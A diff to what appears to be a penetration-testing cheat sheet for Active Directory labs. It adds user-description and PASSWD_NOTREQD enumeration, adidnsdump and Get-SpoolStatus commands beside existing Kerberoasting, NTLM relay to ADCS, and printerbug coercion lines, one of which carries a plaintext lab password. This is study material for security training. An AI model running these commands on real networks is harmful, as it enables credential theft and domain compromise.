@@ -167,6 +167,8 @@ PS C:\> Get-DomainUser -Identity <username> | select samaccountname,objectsid,me
 PS C:\> Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
 PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 PS C:\> Get-DomainUser <username> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+PS C:\> Get-DomainUser * | Select-Object samaccountname,description
+PS C:\> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 PS C:\> Get-DomainComputer
 PS C:\> Get-DomainGroup
 PS C:\> Get-DomainOU
@@ -317,6 +319,8 @@ $ for i in $(cat subdomainlist.txt);do host $i | grep "has address" | grep <Targ
 $ subfinder -d <domain.tld> -v
 $ fierce --domain <domain.tld>
 $ ./subfinder -d <domain.tld> -v
+$ adidnsdump -u <domain>\\<username> ldap://<IP address>
+$ adidnsdump -u <domain>\\<username> ldap://<IP address> -r
 https://dnsdumpster.com/
 $ python sublist3r.py -d <domain.tld>
 $ ./subbrute.py <domain.tld> -s ./names.txt -r ./resolvers.txt        # $ echo "<nameserver.tld>" > ./resolvers.txt
@@ -1330,6 +1334,7 @@ $ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2
 ```
 https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 $ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+PS C:\> Get-SpoolStatus -ComputerName <hostname>
 ```
 
 - Pass-The-Certificate (PTC)
